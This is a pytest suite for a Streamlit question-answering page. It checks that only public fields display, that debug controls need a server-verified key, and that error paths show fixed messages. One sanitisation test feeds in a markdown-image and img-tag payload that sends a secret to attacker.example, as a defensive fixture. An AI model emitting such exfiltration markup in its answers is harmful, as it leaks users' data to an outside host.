"""Item 9: the Ask page renders only public fields on every display path
(P1-P9 in p3m3/item-9-json-panel-remediation-plan.md), plus the fail-closed
gating of the development-only controls. Offline: api_client.call_json and
call_stream are monkeypatched; no network, no DB."""
import sys
from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parent))
import api_client  # noqa: E402
from test_public_view import (  # noqa: E402
    ANSWER, CLEAN_REF, HOST, RAW, SENTINEL_MODEL, VAL, full_response,
)

PAGE = str(Path(__file__).resolve().parents[1] / "MVP_Layered_Ask.py")
STREAM = "/ask/stream (freeform, no retry)"
FORBIDDEN = [HOST, RAW, VAL, "::", SENTINEL_MODEL, "local-inference", "dev-skill-marker", "forced_bad_json",
             "Latency", "Served by", "Total cost", "Input cost", "Prompt tokens", "embedding_cost", "confidence",
             "sources_needed", "Raw JSON", "Raw model output", "Validation error"]
PROVIDER_STATUS = [
    {"provider": f"local-inference@{HOST}:8011", "model": "m", "status": "configured", "base_url": f"http://{HOST}:8011/v1",
     "compatible_with": "openai"},
    {"provider": "groq", "model": "g", "status": "configured", "base_url": "https://api.example-groq.test/v1",
     "compatible_with": "openai"},
]


class Net:
    def __init__(self):
        self.calls = []
        self.ask = (200, full_response())
        self.stream = (200, "streamed answer text", f"local-inference@{HOST}:8011:m", True, ["docA::3"], ["dev-skill-marker"])
        self.debug_status = 200

    def call_json(self, method, url, payload=None, headers=None):
        self.calls.append((method, url, payload, headers))
        if url.endswith("/corpus-summary"):
            return 200, {"summary": "corpus", "document_count": 3}
        if url.endswith("/providers/status"):
            return 200, PROVIDER_STATUS
        if "/debug/events" in url:
            if HOST not in url:  # a visitor-supplied server that happily answers 200
                return 200, []
            return self.debug_status, []
        if url.endswith("/ask"):
            return self.ask
        return 200, {}

    def call_stream(self, url, payload):
        self.calls.append(("STREAM", url, payload, None))
        return self.stream


@pytest.fixture
def net(monkeypatch):
    n = Net()
    monkeypatch.setenv("API_BASE_URL", f"https://{HOST}")
    monkeypatch.setattr(api_client, "call_json", n.call_json)
    monkeypatch.setattr(api_client, "call_stream", n.call_stream)
    return n


def elements(block):
    for c in block.children.values():
        yield c
        if getattr(c, "children", None):
            yield from elements(c)


def page_text(at) -> str:
    return "\n".join(str(getattr(e, "proto", e)) for blk in (at.main, at.sidebar) for e in elements(blk))


def submit(at, stream=False, key=None):
    if key is not None:
        at.sidebar.text_input(key="debug_key_input").set_value(key)
    if stream:
        at.radio[0].set_value(STREAM)
    at.run()
    next(b for b in at.button if b.label == "Ask").click()
    at.run()
    assert not at.exception
    return page_text(at)


def fresh():
    at = AppTest.from_file(PAGE, default_timeout=60)
    at.run()
    assert not at.exception
    return at


def assert_clean(text):
    for bad in FORBIDDEN:
        assert bad not in text, bad
    for bad in ("0.000777", "4321", "987654"):
        assert bad not in text, bad


def test_ask_success_renders_only_public(net):
    text = submit(fresh())
    assert_clean(text)
    assert ANSWER in text and "Retrieval-augmented generation" in text  # answer + clean reference present
    assert "Response (JSON, public fields)" in text and "Grounded in retrieved context" in text
    assert "Bad, A." not in text and "Http, C." not in text  # unsafe references withheld


@pytest.mark.parametrize("status,data", [
    (502, {"detail": f"schema fail {RAW} {VAL}"}),
    (503, {"detail": f"forced provider 'local-inference@{HOST}:8011' unavailable"}),
    (500, f"<html>edge page {HOST}</html>"),
    (422, {"detail": [{"loc": ["body", "question"], "input": RAW}]}),
    (0, {"error": f"Could not reach https://{HOST}/ask"}),
])
def test_ask_error_paths_render_fixed_messages(net, status, data):
    net.ask = (status, data)
    text = submit(fresh())
    assert_clean(text)
    from public_view import PUBLIC_ERROR_MESSAGES, error_class
    assert PUBLIC_ERROR_MESSAGES[error_class(status)] in text


def test_stream_path_renders_only_public(net):
    text = submit(fresh(), stream=True)
    assert_clean(text)
    assert "streamed answer text" in text and "RAG grounded" in text
    net.stream = (503, f'{{"detail": "provider local-inference@{HOST}:8011 down"}}', f"local-inference@{HOST}:8011:m",
                  None, ["docA::3"], ["dev-skill-marker"])
    text = submit(fresh(), stream=True)
    assert_clean(text)
    from public_view import PUBLIC_ERROR_MESSAGES
    assert PUBLIC_ERROR_MESSAGES["provider_failed"] in text


def test_public_sidebar_has_no_provider_inventory_or_costs(net):
    at = fresh()
    text = submit(at)
    assert_clean(text)
    for bad in ("Provider status", "Running costs", "Latency (this session)", "groq", "base_url", "api.example-groq"):
        assert bad not in text, bad
    assert not any(c[1].endswith("/providers/status") for c in net.calls)  # not even fetched


def test_selector_is_auto_only_and_request_carries_no_override(net):
    at = fresh()
    sel = next(s for s in at.selectbox if s.label == "Provider")
    assert list(sel.options) == ["Auto (free-tier-first)"] and sel.disabled
    assert not any(c.label.startswith("Force a bad first response") for c in at.checkbox)
    text = submit(at)
    assert "groq" not in text and HOST not in text
    posts = [c for c in net.calls if c[0] == "POST" and c[1].endswith("/ask")]
    assert posts and posts[-1][2].get("force_bad") in (False, None) and not posts[-1][2].get("provider")
    assert not posts[-1][2].get("model")


def test_unknown_field_page_keeps_answer_hides_field(net):
    net.ask = (200, full_response(brand_new_field="UNKNOWN-VALUE-MARKER"))
    text = submit(fresh())
    assert "UNKNOWN-VALUE-MARKER" not in text and "brand_new_field" not in text
    assert ANSWER in text


def test_unrecognised_answer_shape_withholds(net):
    net.ask = (200, full_response(answer={"unexpected": "UNKNOWN-VALUE-MARKER"}))
    text = submit(fresh())
    from public_view import WITHHELD_MESSAGE
    assert WITHHELD_MESSAGE in text and "UNKNOWN-VALUE-MARKER" not in text and ANSWER not in text


def test_dev_mode_requires_server_verified_key(net):
    net.debug_status = 401  # wrong key: stays public
    at = fresh()
    submit(at, key="wrong")
    sel = next(s for s in at.selectbox if s.label == "Provider")
    assert list(sel.options) == ["Auto (free-tier-first)"]
    assert not any(c.label.startswith("Force a bad first response") for c in at.checkbox)
    assert any(c[1].endswith("/debug/events?limit=1") and c[3] == {"X-Debug-Key": "wrong"} for c in net.calls)


def test_dev_mode_unlocks_controls_but_display_stays_public(net):
    at = fresh()
    text = submit(at, key="good-key")
    sel = next(s for s in at.selectbox if s.label == "Provider")
    assert "groq" in list(sel.options) and not sel.disabled
    assert any(c.label.startswith("Force a bad first response") for c in at.checkbox)
    # the response area still shows only public fields
    main_text = "\n".join(str(getattr(e, "proto", e)) for e in elements(at.main))
    for bad in (RAW, VAL, "::", "dev-skill-marker", "Latency", "Served by", "Total cost", "Raw JSON"):
        assert bad not in main_text, bad
    assert ANSWER in main_text


def test_dev_mode_fails_closed_when_check_errors(net):
    net.debug_status = 0
    at = fresh()
    submit(at, key="k")
    assert list(next(s for s in at.selectbox if s.label == "Provider").options) == ["Auto (free-tier-first)"]


def debug_calls(net):
    return [c for c in net.calls if "/debug/events" in c[1]]


def is_public(at):
    sel = next(s for s in at.selectbox if s.label == "Provider")
    return list(sel.options) == ["Auto (free-tier-first)"] and not any(
        c.label.startswith("Force a bad first response") for c in at.checkbox)


def set_key(at, key="k"):
    at.sidebar.text_input(key="debug_key_input").set_value(key)
    at.run()


def test_bypass_custom_endpoint_then_swap_back_is_impossible_no_endpoint_input(net):
    at = fresh()
    labels = [t.label for t in at.sidebar.text_input] + [t.label for t in at.text_input]
    assert not any("base url" in l.lower() or "endpoint" in l.lower() for l in labels)
    assert "Custom API base URL" not in page_text(at)
    net.debug_status = 401
    set_key(at, "anything")
    assert is_public(at)
    assert len(debug_calls(net)) == 1 and HOST in debug_calls(net)[0][1]


def test_sf8_requests_only_go_to_configured_endpoint(net):
    at = fresh()
    set_key(at, "k")
    submit(at)
    submit(fresh(), stream=True)
    assert net.calls
    for _, url, *_ in net.calls:
        assert url.startswith(f"https://{HOST}/"), url


@pytest.mark.parametrize("status", [401, 403, 0, 429, 500])
def test_shared_ip_lockout_amplification_one_check_per_key(net, status):
    net.debug_status = status
    at = fresh()
    set_key(at, "wrong-key")
    for _ in range(8):
        at.run()
    next(b for b in at.button if b.label == "Ask").click()
    at.run()
    for _ in range(3):
        at.run()
    assert len(debug_calls(net)) == 1 and is_public(at)


def test_no_check_without_key(net):
    at = fresh()
    at.run()
    assert debug_calls(net) == []


def test_returning_to_a_previous_key_does_not_recheck(net):
    net.debug_status = 401
    at = fresh()
    set_key(at, "a")
    set_key(at, "b")
    set_key(at, "a")
    assert len(debug_calls(net)) == 2


def test_unverifiable_check_shows_caption_and_retries_only_on_click(net):
    net.debug_status = 503
    at = fresh()
    set_key(at, "k")
    assert "Key could not be checked; try again later" in page_text(at) and is_public(at)
    net.debug_status = 200
    at.run()
    assert is_public(at) and len(debug_calls(net)) == 1
    next(b for b in at.sidebar.button if b.label == "Retry key check").click()
    at.run()
    assert not is_public(at) and len(debug_calls(net)) == 2


def test_verdict_is_bound_to_endpoint_and_key_and_reverified_when_cleared(net, monkeypatch):
    at = fresh()
    set_key(at, "k")
    assert not is_public(at) and len(debug_calls(net)) == 1
    at.session_state["_dev_mode_verdicts"] = {}          # cleared / reset entry
    at.run()
    assert len(debug_calls(net)) == 2 and not is_public(at)
    forged = {"deadbeef": True}                          # a verdict bound to some other pair does not unlock
    at2 = fresh()
    at2.session_state["_dev_mode_verdicts"] = forged
    at2.session_state["_dev_mode_attempts"] = {"deadbeef": 200}
    net.debug_status = 401
    set_key(at2, "other")
    assert is_public(at2)


def test_sf9_malformed_endpoint_and_exceptions_give_fixed_message_no_traceback(net, monkeypatch):
    import httpx
    from public_view import PUBLIC_ERROR_MESSAGES
    secret = "SECRET-EXC-TEXT-https://sentinel-exc.example"

    def boom(*a, **k):
        raise httpx.InvalidURL(secret)

    for exc_factory in (boom, lambda *a, **k: (_ for _ in ()).throw(ValueError(secret)),
                        lambda *a, **k: (_ for _ in ()).throw(RuntimeError(secret))):
        monkeypatch.setattr(api_client, "call_json", exc_factory)
        monkeypatch.setattr(api_client, "call_stream", exc_factory)
        monkeypatch.setattr(api_client, "triage_api", exc_factory)
        at = AppTest.from_file(PAGE, default_timeout=60)
        at.run()
        assert not at.exception
        for stream in (False, True):
            text = submit(at, stream=stream)
            assert secret not in text and "sentinel-exc" not in text and "Traceback" not in text
            assert PUBLIC_ERROR_MESSAGES["unreachable"] in text
        next(b for b in at.button if b.label == "Check API health").click()
        at.run()
        assert not at.exception and secret not in page_text(at)


def test_sf9_malformed_configured_endpoint_real_client(monkeypatch):
    # real api_client: a malformed API_BASE_URL must not surface httpx text or a traceback
    monkeypatch.setenv("API_BASE_URL", "http://[bad host")
    at = AppTest.from_file(PAGE, default_timeout=60)
    at.run()
    assert not at.exception
    next(b for b in at.button if b.label == "Ask").click()
    at.run()
    assert not at.exception
    text = page_text(at)
    assert "Traceback" not in text and "InvalidURL" not in text


def test_page_renders_sanitised_answer_ask_and_stream(net):
    evil = "Hello ![x](https://attacker.example/?q=SECRET) <img src=https://attacker.example/y> www.corp.internal end"
    net.ask = (200, full_response(answer={"answer": evil}))
    text = submit(fresh())
    assert "attacker.example" not in text and "<img" not in text and "Hello" in text
    net.stream = (200, evil, None, None, [], [])
    text = submit(fresh(), stream=True)
    assert "attacker.example" not in text and "<img" not in text and "Hello" in text
    assert "unsafe_allow_html=True" not in Path(PAGE).read_text().split("def render_response_summary")[1].split("def ")[0]


def test_lone_surrogate_answer_does_not_crash_page_ask_and_stream(net):
    net.ask = (200, full_response(answer={"answer": "ans \ud83d tail"}))
    text = submit(fresh())
    assert "tail" in text
    net.stream = (200, "stream \ud83d tail", None, None, [], [])
    at = fresh()
    text = submit(at, stream=True)
    assert "tail" in text and not at.exception
